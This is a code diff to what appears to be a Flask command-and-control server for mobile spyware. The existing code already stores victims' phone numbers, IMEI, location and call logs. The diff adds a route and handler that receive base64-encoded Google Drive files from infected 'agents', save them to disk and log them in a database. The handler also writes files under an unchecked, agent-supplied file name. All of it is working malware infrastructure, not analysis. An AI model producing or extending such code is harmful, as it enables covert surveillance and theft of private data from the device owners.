@@ -89,6 +89,12 @@ def viewCallLog():
     sql = "SELECT * FROM calllog"
     data_rows, columns = get_data_sql(sql)
     return render_template("callLogs.html", title="CallLogs", columns=columns, data=data_rows)
+    
+@app.route("/googledata")
+def viewGoogleData():
+    sql = "SELECT * FROM googledata"
+    data_rows, columns = get_data_sql(sql)
+    return render_template("googledata.html", title="Google Drive Data", columns=columns, data=data_rows)
 
 #############
 # C2 Routes #
@@ -161,7 +167,8 @@ def receiveResult(id):
             return handle_location(content["data"], id)
         elif code == "callLog":
             return handle_calllog(content["data"], id)
-        
+        elif code == "googledata":
+            return handle_googledata(content["data"], id)
     else:
         return ("\n", 204)
 
@@ -307,6 +314,25 @@ def handle_calllog(content, id):
 
         return ("Success", 200)
 
+        
+def handle_googledata(content, id):
+    print(f"Received Google Drive Data.\n\n")
+    clearAgentTasks(id)
+    
+    for json_data in content:
+        file_name = json_data.get("file_name","")
+        encoded_bytes = json_data.get("bytes", "")   
+        decoded_bytes = base64.b64decode(encoded_bytes)
+        path = "googledata/"+file_name
+        with open("static/" + path, 'wb') as f: 
+            f.write(decoded_bytes)
+            
+        # Save data to database
+        sql = "INSERT INTO googledata VALUES (?, ?)"
+        args = (id, path)
+        writeToDatabase(sql, args)
+    
+    return ("Success", 200)
 
 ####################
 # Helper functions #
@@ -384,7 +410,9 @@ def init_database():
             "CREATE TABLE IF NOT EXISTS telephonydetails(id TEXT, phoneNumber TEXT, imei TEXT)",
             
             "CREATE TABLE IF NOT EXISTS location(id TEXT, latitude TEXT, longitude TEXT)",
-            "CREATE TABLE IF NOT EXISTS calllog(id TEXT, number TEXT, type TEXT, date TEXT, duration TEXT)"
+            "CREATE TABLE IF NOT EXISTS calllog(id TEXT, number TEXT, type TEXT, date TEXT, duration TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS googledata (id TEXT, path TEXT)",
         ]
 
         for sql in sqls:
